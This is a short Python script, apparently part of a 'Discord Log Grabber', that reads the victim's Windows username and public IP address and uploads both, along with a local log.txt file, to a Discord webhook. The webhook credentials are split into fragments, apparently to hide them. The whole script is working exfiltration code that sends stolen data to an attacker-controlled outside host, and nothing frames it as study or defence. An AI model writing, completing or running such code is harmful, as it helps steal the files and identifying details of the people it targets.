from urllib.request import Request, urlopen
import discord
import os

def GetIP():
    ip = "Can't get IP"
    try:
        ip = urlopen(Request("https://api.ipify.org?format=text")).read().decode().strip()
    except:
        pass
    return ip.replace("\"", "")

part1 = '9316956621'
part2 = '21254972'
key1 = 'Kj7KC8bCf-nTjEWXFIM_mJ80JsE-I2Ehw_FDPQ0hq2fAI'
key2 = 'ivYbJN2FZjo17KcEWHKAYS0'
webhook = discord.Webhook.partial(part1 + part2, key1 + key2, adapter=discord.RequestsWebhookAdapter())

with open(file='log.txt', mode='rb') as f:
    discord_file = discord.File(f)

webhook.send('Username: ' + os.getenv("UserName") + '\n' + "ip: " + GetIP() + '\n', username='Discord Log Grabber', avatar_url='https://i.ibb.co/c3P5DbN/Gigachad.png', file=discord_file)
